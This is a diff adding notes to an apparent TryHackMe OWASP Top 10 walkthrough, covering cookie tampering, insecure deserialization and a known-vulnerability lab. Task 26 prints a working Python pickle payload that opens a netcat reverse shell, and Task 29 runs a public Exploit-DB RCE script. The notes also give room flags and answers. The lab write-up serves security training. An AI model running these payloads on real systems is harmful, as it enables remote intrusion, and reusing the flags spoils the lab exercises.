@@ -79,6 +79,89 @@ W3LL_D0N3_LVL2
 hint: <script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
 websites_can_be_easily_defaced_with_xss
 
+
+#Task 25 [Severity 8] Insecure Deserialization - Cookies Practical 
+Accessing your Instance
+﻿In the browser of the device that you are connected to the VPN with, navigate to http://10.10.245.143. I will be detailing the steps for Firefox - you may have to research how to inspect cookies in the browser of your choice. You will be greeted with the home page:
+Create acount --> login
+Right-Click the Page and press "Inspect Element". Navigate to the "Storage" tab.
+or F12 --> Storage
+--> value --> sessionsID --> copy gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAYzFkOTc2YzhiNjkyNDkzYzkxYTViNTYyOTVmMDFjYWFxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==
+
+https://gchq.github.io/CyberChef/
+select from base64 --> paste input "gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAYzFkOTc2YzhiNjkyNDkzYzkxYTViNTYyOTVmMDFjYWFxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg=="
+
+---> output ..}q.(X	...sessionIdq.X ...c1d976c8b692493c91a5b56295f01caaq.X....encodedflagq.X....THM{good_old_base64_huh}q.u.
+
+or p.2 echo gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAYzFkOTc2YzhiNjkyNDkzYzkxYTViNTYyOTVmMDFjYWFxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg== > sessionid.txt | cat sessionid.txt | base64 -d
+
+THM{good_old_base64_huh}
+
+Or Burp Suite -- decode
+paste input: gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAYzFkOTc2YzhiNjkyNDkzYzkxYTViNTYyOTVmMDFjYWFxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==
+--- base64 --> output text
+
+
+- 2nd flag (admin dashboard)
+Modifying Cookie Values
+Notice here that you have a cookie named "userType". You are currently a user, as confirmed by your information on the "myprofile" page.
+This application determines what you can and cannot see by your userType. What if you wanted to be come an admin?
+Double left-click the "Value" column of "userType" to modify the contents. Let's change our userType to "admin" and navigate to http://10.10.245.143/admin to answer the second flag.
+THM{heres_the_admin_flag} 
+
+#Task 26 [Severity 8] Insecure Deserialization - Code Execution 
+1. First, change the value of the userType cookie from "admin" to "user" and return to http://10.10.245.143/myprofile 
+
+copy raw in
+https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3
+vi rce.py
+####
+import pickle
+import sys
+import base64
+
+command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat $MyIP 4444 > /tmp/f'
+
+class rce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(command,))
+
+print(base64.b64encode(pickle.dumps(rce())))
+######
+
+python rce.py
+Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuNi44OC4yMjcgNDQ0NCA+IC90bXAvZicKcDEKdHAyClJwMwou
+
+on kalimachine: nc -lnvp 4444
+on target machine: change value encodedPayload = Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuNi44OC4yMjcgNDQ0NCA+IC90bXAvZicKcDEKdHAyClJwMwou
+run web
+on kalimachine: $find / -type f -name flag.txt 2>/dev/null
+/home/cmnatic/flag.txt
+$cat /home/cmnatic/flag.txt
+4a69a7ff9fd68
+
+#Task 29 [Severity 9] Components With Known Vulnerabilities - Lab 
+- How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)
+hint: http://10.10.61.245/
+google CSE bookstore rce
+---> https://www.exploit-db.com/exploits/47887
+download
+python3 47887.py http://10.10.61.245
+RCE$ wc -c /etc/passwd
+1611 /etc/passwd
+1611
+
+#Task 30 [Severity 10] Insufficient Logging and Monitoring 
+- What IP address is the attacker using?
+49.99.13.16
+
+
+- What kind of attack is being carried out?
+Brute Force
+
+
+ 
 https://tryhackme.com/room/owasptop10
 https://h0j3n.medium.com/tryhackme-owasp-top-10-5d168ff0563b
 https://musyokaian.medium.com/owasp-top-10-tryhackme-b7d02f29254b
@@ -86,10 +169,7 @@ https://blog.raw.pm/en/TryHackMe-OWASP-Top-10-write-up/
 https://jinshiranai.hashnode.dev/tryhackme-owasp-top-10-write-up
 https://www.programmersought.com/article/91937600358/
 https://swafox.com/thm-owasp/
-https://vicksecurity.com/tryhackme/owasp-top-10-tryhackme-walkthrough-writeup/
 https://www.m14ghost.me/
-https://dev.to/qwezii/walkthrough-owasp-top-10-tryhackme-26lk
-https://cd6629.gitbook.io/ctfwriteups/syntax/owasp-top-10-tryhackme
 https://markramige.com/posts/tryhackme-owasp-top-10-write-up/
 https://blog.csdn.net/qq_45414878/article/details/109639974
 https://hsangade.blogspot.com/2020/07/owsap-top-10-walkthrough-task-1-to-task.html#d5  <--learn
